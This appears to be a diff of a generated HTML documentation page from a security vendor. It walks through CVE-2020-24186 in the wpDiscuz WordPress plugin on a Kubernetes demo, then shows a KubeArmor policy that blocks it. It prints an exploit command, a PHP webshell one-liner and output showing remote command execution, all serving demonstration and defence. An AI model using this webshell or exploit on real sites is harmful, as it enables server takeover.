@@ -150,46 +150,6 @@
     
     
     
-      <label class="md-header__button md-icon" for="__search">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
-      </label>
-      
-<div class="md-search" data-md-component="search" role="dialog">
-  <label class="md-search__overlay" for="__search"></label>
-  <div class="md-search__inner" role="search">
-    <form class="md-search__form" name="search">
-      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
-      <label class="md-search__icon md-icon" for="__search">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-      </label>
-      <nav class="md-search__options" aria-label="Search">
-        
-          <a href="javascript:void(0)" class="md-search__icon md-icon" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg>
-          </a>
-        
-        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
-        </button>
-      </nav>
-      
-        <div class="md-search__suggest" data-md-component="search-suggest"></div>
-      
-    </form>
-    <div class="md-search__output">
-      <div class="md-search__scrollwrap" data-md-scrollfix>
-        <div class="md-search-result" data-md-component="search-result">
-          <div class="md-search-result__meta">
-            Initializing search
-          </div>
-          <ol class="md-search-result__list"></ol>
-        </div>
-      </div>
-    </div>
-  </div>
-</div>
-    
     
       <div class="md-header__source">
         
@@ -3674,6 +3634,8 @@
         
           
         
+          
+        
       
       
         <label class="md-nav__link" for="__nav_4_11_4_1">
@@ -3766,6 +3728,20 @@
     <li class="md-nav__item">
       <a href="../../getting-started/jira-integration/" class="md-nav__link">
         Jira
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../getting-started/rsyslog-integration/" class="md-nav__link">
+        RSyslog
       </a>
     </li>
   
@@ -4195,19 +4171,19 @@
 </blockquote>
 <p><img alt="" src="../images/wordpress-2.png" /></p>
 <p>We’ll deploy the WordPress application on Kubernetes and install  <code>wpDiscuz</code>  on it. Get the external IP of the application to access the same. For this, we have created a complete YAML for WordPress installation on Kubernetes. You can use this predefined deployment file to quickly deploy WordPress to your Kubernetes environment.</p>
-<div class="highlight"><pre><span></span><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/wordpress-demo/k8s-wordpress.yaml
+<div class="highlight"><pre><span></span><code>kubectl<span class="w"> </span>apply<span class="w"> </span>-f<span class="w"> </span>https://raw.githubusercontent.com/accuknox/samples/main/wordpress-demo/k8s-wordpress.yaml
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>kubectl get pod -n wordpress-mysql
+<div class="highlight"><pre><span></span><code>kubectl<span class="w"> </span>get<span class="w"> </span>pod<span class="w"> </span>-n<span class="w"> </span>wordpress-mysql
 
-NAME                               READY   STATUS    RESTARTS   AGE
-wordpress-5d5d448dcc-52mcj         <span class="m">1</span>/1     Running   <span class="m">0</span>          4d10h
-wordpress-mysql-7757f9f8c8-2j8wm   <span class="m">1</span>/1     Running   <span class="m">0</span>          4d9h
+NAME<span class="w">                               </span>READY<span class="w">   </span>STATUS<span class="w">    </span>RESTARTS<span class="w">   </span>AGE
+wordpress-5d5d448dcc-52mcj<span class="w">         </span><span class="m">1</span>/1<span class="w">     </span>Running<span class="w">   </span><span class="m">0</span><span class="w">          </span>4d10h
+wordpress-mysql-7757f9f8c8-2j8wm<span class="w">   </span><span class="m">1</span>/1<span class="w">     </span>Running<span class="w">   </span><span class="m">0</span><span class="w">          </span>4d9h
 
-kubectl get svc -n wordpress-mysql
+kubectl<span class="w"> </span>get<span class="w"> </span>svc<span class="w"> </span>-n<span class="w"> </span>wordpress-mysql
 
-NAME             TYPE          CLUSTER-IP   EXTERNAL-IP   PORT<span class="o">(</span>S<span class="o">)</span>       
-wordpress        LoadBalancer  <span class="m">10</span>.16.12.13  <span class="m">35</span>.232.52.87  <span class="m">80</span>:31790/TCP 
-wordpress-mysql  ClusterIP     None         &lt;none&gt;        <span class="m">3306</span>/TCP 
+NAME<span class="w">             </span>TYPE<span class="w">          </span>CLUSTER-IP<span class="w">   </span>EXTERNAL-IP<span class="w">   </span>PORT<span class="o">(</span>S<span class="o">)</span><span class="w">       </span>
+wordpress<span class="w">        </span>LoadBalancer<span class="w">  </span><span class="m">10</span>.16.12.13<span class="w">  </span><span class="m">35</span>.232.52.87<span class="w">  </span><span class="m">80</span>:31790/TCP<span class="w"> </span>
+wordpress-mysql<span class="w">  </span>ClusterIP<span class="w">     </span>None<span class="w">         </span>&lt;none&gt;<span class="w">        </span><span class="m">3306</span>/TCP<span class="w"> </span>
 </code></pre></div>
 <blockquote>
 <p>Here the external IP is <a href="http://35.232.52.87/">http://35.232.52.87/</a></p>
@@ -4348,32 +4324,32 @@ wordpress-mysql  ClusterIP     None         &lt;none&gt;        <span class="m">
 <span class="n">code_exec</span><span class="p">()</span>
 </code></pre></div>
 <p>This python code requires the URL to the WordPress site and the blogpost endpoint. We’ll get both of these from the UI.</p>
-<div class="highlight"><pre><span></span><code>python3 exploit.py -u http://35.232.52.87/ -p /2021/12/16/hello-world
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>exploit.py<span class="w"> </span>-u<span class="w"> </span>http://35.232.52.87/<span class="w"> </span>-p<span class="w"> </span>/2021/12/16/hello-world
 </code></pre></div>
 <p>The command will upload an arbitrary PHP file with  <code>&lt;?php system($_GET['cmd']); ?&gt;</code>  and then access this file to trigger execution on the server, thereby achieving remote code execution.</p>
 <div class="highlight"><pre><span></span><code>---------------------------------------------------------------
-<span class="o">[</span>-<span class="o">]</span> Wordpress Plugin wpDiscuz <span class="m">7</span>.0.4 - Remote Code Execution
-<span class="o">[</span>-<span class="o">]</span> File Upload Bypass Vulnerability - PHP Webshell Upload
-<span class="o">[</span>-<span class="o">]</span> CVE: CVE-2020-24186
-<span class="o">[</span>-<span class="o">]</span> https://github.com/hevox
---------------------------------------------------------------- 
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Wordpress<span class="w"> </span>Plugin<span class="w"> </span>wpDiscuz<span class="w"> </span><span class="m">7</span>.0.4<span class="w"> </span>-<span class="w"> </span>Remote<span class="w"> </span>Code<span class="w"> </span>Execution
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>File<span class="w"> </span>Upload<span class="w"> </span>Bypass<span class="w"> </span>Vulnerability<span class="w"> </span>-<span class="w"> </span>PHP<span class="w"> </span>Webshell<span class="w"> </span>Upload
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>CVE:<span class="w"> </span>CVE-2020-24186
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>https://github.com/hevox
+---------------------------------------------------------------<span class="w"> </span>
 
-<span class="o">[</span>+<span class="o">]</span> Response length:<span class="o">[</span><span class="m">101559</span><span class="o">]</span> <span class="p">|</span> code:<span class="o">[</span><span class="m">200</span><span class="o">]</span>
-<span class="o">[</span>!<span class="o">]</span> Got wmuSecurity value: fbf0656b17
-<span class="o">[</span>!<span class="o">]</span> Got wmuSecurity value: <span class="m">1</span> 
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Response<span class="w"> </span>length:<span class="o">[</span><span class="m">101559</span><span class="o">]</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>code:<span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>wmuSecurity<span class="w"> </span>value:<span class="w"> </span>fbf0656b17
+<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>wmuSecurity<span class="w"> </span>value:<span class="w"> </span><span class="m">1</span><span class="w"> </span>
 
-<span class="o">[</span>+<span class="o">]</span> Generating random name <span class="k">for</span> Webshell...
-<span class="o">[</span>!<span class="o">]</span> Generated webshell name: bmrorpjvojkbbko
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Generating<span class="w"> </span>random<span class="w"> </span>name<span class="w"> </span><span class="k">for</span><span class="w"> </span>Webshell...
+<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Generated<span class="w"> </span>webshell<span class="w"> </span>name:<span class="w"> </span>bmrorpjvojkbbko
 
-<span class="o">[</span>!<span class="o">]</span> Trying to Upload Webshell..
-<span class="o">[</span>+<span class="o">]</span> Upload Success... Webshell path:http://35.232.52.87/wp-content/uploads/2021/12/bmrorpjvojkbbko-1640016084.4304.php 
+<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>Upload<span class="w"> </span>Webshell..
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Upload<span class="w"> </span>Success...<span class="w"> </span>Webshell<span class="w"> </span>path:http://35.232.52.87/wp-content/uploads/2021/12/bmrorpjvojkbbko-1640016084.4304.php<span class="w"> </span>
 
-&gt; hostname
+&gt;<span class="w"> </span>hostname
 
 
 wordpress-5d5d448dcc-52mcj
 
-&gt; 
+&gt;<span class="w"> </span>
 </code></pre></div>
 <h3 id="defending-against-the-attack">Defending against the Attack<a class="headerlink" href="#defending-against-the-attack" title="Permanent link">&para;</a></h3>
 <p>In order to defend against the attack, we dig a little deeper and found the root cause to be the "<strong>unrestricted file upload</strong>" when coupled with double extensions (e.g., ".php.gif") bypassed sanity checks.</p>
@@ -4402,30 +4378,30 @@ spec:
     action: Block
 </code></pre></div>
 <p>You can simply take advantage of our open-source  <a href="https://github.com/kubearmor/policy-templates">GitHub</a>  inventory, and apply  <a href="https://raw.githubusercontent.com/kubearmor/policy-templates/main/cve/system/ksp-cve-2020-24186-deny-wordpress-rce.yaml">Policy</a>  directly from there:</p>
-<div class="highlight"><pre><span></span><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/cve/system/ksp-cve-2020-24186-deny-wordpress-rce.yaml
+<div class="highlight"><pre><span></span><code>kubectl<span class="w"> </span>apply<span class="w"> </span>-f<span class="w"> </span>https://raw.githubusercontent.com/kubearmor/policy-templates/main/cve/system/ksp-cve-2020-24186-deny-wordpress-rce.yaml
 </code></pre></div>
 <h4 id="checking-the-policy-logs-on-kubearmor">Checking the policy logs on KubeArmor<a class="headerlink" href="#checking-the-policy-logs-on-kubearmor" title="Permanent link">&para;</a></h4>
 <p>To check how to do it, kindly go through our  <a href="https://help.accuknox.com/open-source/kubearmor-install/#4-getting-alertstelemetry-from-kubearmor">help section</a>.</p>
 <p><strong>Blocked Policy Log Created by KubeArmor</strong></p>
-<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1640059272</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;updatedTime&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-12-21T04:01:12.676169Z&quot;</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;hostName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;gke-cys-poc-default-pool-3be49535-k4cp&quot;</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;namespaceName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;wordpress-mysql&quot;</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;podName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;wordpress-5d5d448dcc-52mcj&quot;</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;containerID&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;9d477215d2288de4cd5ff63f387a808fe1bf3663d130362bebf33c546427e09c&quot;</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;containerName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;wordpress&quot;</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;hostPid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3863212</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;ppid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">120</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;uid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">33</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ContainerLog&quot;</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;source&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;apache2&quot;</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;operation&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;File&quot;</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;resource&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/var/www/html/wp-content/uploads/2021/12/xjeyirtptddiemf-1640059272.6737.php&quot;</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;syscall=SYS_OPEN flags=O_WRONLY|O_CREAT|O_TRUNC&quot;</span><span class="p">,</span><span class="w"></span>
-<span class="w">  </span><span class="nt">&quot;result&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Permission denied&quot;</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1640059272</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;updatedTime&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-12-21T04:01:12.676169Z&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;hostName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;gke-cys-poc-default-pool-3be49535-k4cp&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;namespaceName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;wordpress-mysql&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;podName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;wordpress-5d5d448dcc-52mcj&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;containerID&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;9d477215d2288de4cd5ff63f387a808fe1bf3663d130362bebf33c546427e09c&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;containerName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;wordpress&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;hostPid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3863212</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;ppid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">120</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;uid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">33</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ContainerLog&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;source&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;apache2&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;operation&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;File&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;resource&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/var/www/html/wp-content/uploads/2021/12/xjeyirtptddiemf-1640059272.6737.php&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;syscall=SYS_OPEN flags=O_WRONLY|O_CREAT|O_TRUNC&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;result&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Permission denied&quot;</span>
+<span class="p">}</span>
 </code></pre></div>
 <h3 id="accuknoxs-policy-templates-repository">AccuKnox's policy templates repository<a class="headerlink" href="#accuknoxs-policy-templates-repository" title="Permanent link">&para;</a></h3>
 <p>AccuKnox's policy templates is an open-source repo that also contains a wide range of attack prevention techniques including MITRE, as well as hardening techniques for your workloads. Please visit <a href="https://github.com/kubearmor/policy-templates">policy-templates</a> to download and apply policy policies.</p>
